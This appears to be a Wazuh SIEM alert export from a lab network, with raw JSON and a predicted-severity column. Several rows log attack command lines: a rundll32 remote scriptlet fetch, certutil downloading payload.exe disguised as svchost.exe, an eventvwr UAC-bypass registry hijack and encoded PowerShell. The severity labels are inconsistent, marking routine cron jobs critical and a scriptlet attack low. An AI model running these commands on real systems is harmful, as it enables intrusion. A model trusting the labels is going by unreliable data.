@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-30T03:21:11.935Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 43, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:21:11.935Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T03:21:11.935Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T03:21:11.935+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T12:04:07.987Z,Endpoint2-Win,2,92091,Suspicious rundll32 remote scriptlet execution,12,T1218.011,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" javascript:\""..\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:http://192.168.100.20/s.sct\"")","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 38, ""mail"": false, ""level"": 12, ""description"": ""Suspicious rundll32 remote scriptlet execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.011""]}, ""id"": ""92091""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T12:04:07.987Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T12:04:07.987Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" javascript:\\\""..\\mshtml,RunHTMLApplication \\\"";document.write();GetObject(\\\""script:http://192.168.100.20/s.sct\\\"")"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2644"", ""utcTime"": ""2025-12-29 12:04:07.987""}}}}",low
2025-12-28T07:15:38.538Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 47, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T07:15:38.538Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T07:15:38.538Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T07:15:38.538+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T15:25:09.670Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 31, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T15:25:09.670Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T15:25:09.670Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T15:25:09.670+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T00:39:11.638Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T00:39:11.638Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T00:39:11.638Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6383"", ""utcTime"": ""2025-12-29 00:39:11.638""}}}}",critical
2025-12-30T21:28:41.324Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 56, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T21:28:41.324Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T21:28:41.324Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T21:28:41.324+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T20:57:43.070Z,Endpoint3-Win,1,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 15, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T20:57:43.070Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T20:57:43.070Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2480"", ""utcTime"": ""2025-12-29 20:57:43.070""}}}}",critical
2025-12-30T23:14:25.100Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 29, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T23:14:25.100Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T23:14:25.100Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T23:14:25.100+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T17:47:07.029Z,Endpoint1-Win,3,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA=","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 23, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T17:47:07.029Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T17:47:07.029Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8056"", ""utcTime"": ""2025-12-30 17:47:07.029""}}}}",low
2025-12-28T17:46:54.543Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 51, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:46:54.543Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T17:46:54.543Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3785"", ""utcTime"": ""2025-12-28 17:46:54.543""}}}}",low
2025-12-28T05:45:01.624Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 44, ""mail"": false, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T05:45:01.624Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T05:45:01.624Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9153"", ""utcTime"": ""2025-12-28 05:45:01.624""}}}}",low
2025-12-28T16:54:26.472Z,Endpoint2-Win,2,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 17, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T16:54:26.472Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T16:54:26.472Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1153"", ""utcTime"": ""2025-12-28 16:54:26.472""}}}}",critical
2025-12-30T17:37:26.294Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 5, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T17:37:26.294Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T17:37:26.294Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T17:37:26.294+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T23:55:06.601Z,Endpoint1-Win,3,92004,Powershell spawned cmd.exe for UAC bypass behavior,9,T1548.002,EventChannel,"\""cmd.exe\"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d \""C:\Windows\System32\cmd.exe\"" /f & cmd.exe /c eventvwr.msc","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 45, ""mail"": false, ""level"": 9, ""description"": ""Powershell spawned cmd.exe for UAC bypass behavior"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1548.002""]}, ""id"": ""92004""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T23:55:06.601Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T23:55:06.601Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \\\""C:\\Windows\\System32\\cmd.exe\\\"" /f & cmd.exe /c eventvwr.msc"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8484"", ""utcTime"": ""2025-12-30 23:55:06.601""}}}}",medium
2025-12-28T14:30:23.393Z,Endpoint1-Win,3,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 16, ""mail"": false, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T14:30:23.393Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T14:30:23.393Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10370"", ""utcTime"": ""2025-12-28 14:30:23.393""}}}}",low
2025-12-29T17:51:23.302Z,Endpoint1-Win,3,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 2, ""mail"": true, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T17:51:23.302Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T17:51:23.302Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11784"", ""utcTime"": ""2025-12-29 17:51:23.302""}}}}",critical
2025-12-28T19:59:13.008Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 59, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T19:59:13.008Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T19:59:13.008Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T19:59:13.008+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T12:38:43.925Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 39, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T12:38:43.925Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T12:38:43.925Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T12:38:43.925+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-28T15:56:50.651Z,Endpoint1-Win,3,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 44, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T15:56:50.651Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T15:56:50.651Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12811"", ""utcTime"": ""2025-12-28 15:56:50.651""}}}}",critical
2025-12-29T21:44:51.099Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 3, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T21:44:51.099Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T21:44:51.099Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8222"", ""utcTime"": ""2025-12-29 21:44:51.099""}}}}",low
2025-12-29T18:12:11.373Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 59, ""mail"": false, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T18:12:11.373Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T18:12:11.373Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6352"", ""utcTime"": ""2025-12-29 18:12:11.373""}}}}",medium
2025-12-28T12:47:22.205Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 34, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T12:47:22.205Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T12:47:22.205Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T12:47:22.205+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
